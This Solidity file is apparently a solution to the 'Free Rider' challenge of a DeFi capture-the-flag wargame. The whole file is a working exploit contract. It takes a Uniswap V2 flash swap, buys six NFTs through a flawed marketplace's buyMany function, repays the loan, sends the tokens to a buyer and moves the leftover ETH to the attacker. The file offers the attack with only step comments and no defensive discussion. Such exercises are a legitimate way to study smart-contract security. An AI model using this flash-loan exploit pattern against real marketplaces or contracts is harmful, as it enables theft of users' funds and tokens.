// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

// As interface for avoiding pragma mismatch. Also saves gas.
interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract FreeRiderAttacker {
    // Interfaces
    IERC721 private immutable NFT;
    IWETH private immutable WETH;
    IUniswapV2Pair private immutable UNISWAP_PAIR;

    // Addresses
    address private immutable marketplace;
    address private immutable buyer;
    address private immutable attacker;

    // Tokens to buy
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    receive() external payable {}

    constructor(
        address _nft,
        address payable _weth,
        address _pair,
        address payable _marketplace,
        address _buyer
    ) {
        NFT = IERC721(_nft);
        WETH = IWETH(_weth);
        UNISWAP_PAIR = IUniswapV2Pair(_pair);
        marketplace = _marketplace;
        attacker = msg.sender;
        buyer = _buyer;
    }

    function attack(uint256 _amount0) external {
        require(msg.sender == attacker);
        bytes memory _data = "1";

        // 1. Do a flash swap to get WETH
        UNISWAP_PAIR.swap(
            _amount0, // amount0 => WETH
            0, // amount1 => DVT
            address(this), // recipient of flash swap
            _data // passed to uniswapV2Call function that uniswapPair triggers on the recipient (this)
        );
    }

    // Function called by UniswapPair when making the flash swap
    function uniswapV2Call(
        address,
        uint256 _amount0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(UNISWAP_PAIR) && tx.origin == attacker);

        // 2. Get ETH by depositing WETH
        WETH.withdraw(_amount0);

        // 3. Buy NFTs
        (bool nftsBought, ) = marketplace.call{value: _amount0}(
            abi.encodeWithSignature("buyMany(uint256[])", tokenIds)
        );

        // 4. Calculate flash swap's fee and total
        uint256 _fee = (_amount0 * 3) / 997 + 1;
        uint256 _repayAmount = _fee + _amount0;

        // 5. get WETH to pay back the flash swap
        WETH.deposit{value: _repayAmount}();

        // 5. Pay back the flash swap with fee included
        WETH.transfer(address(UNISWAP_PAIR), _repayAmount);

        // 6. Send NFT's to buyer
        for (uint256 i = 0; i < 6; i++) {
            NFT.safeTransferFrom(address(this), buyer, tokenIds[i]);
        }

        // 7. Transfer ETH to attacker
        (bool ethSent, ) = attacker.call{value: address(this).balance}("");
        require(nftsBought && ethSent);
    }

    // Function to allow this contract to receive NFTs
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view returns (bytes4) {
        require(msg.sender == address(NFT) && tx.origin == attacker);
        return 0x150b7a02; //IERC721Receiver.onERC721Received.selector;
    }
}
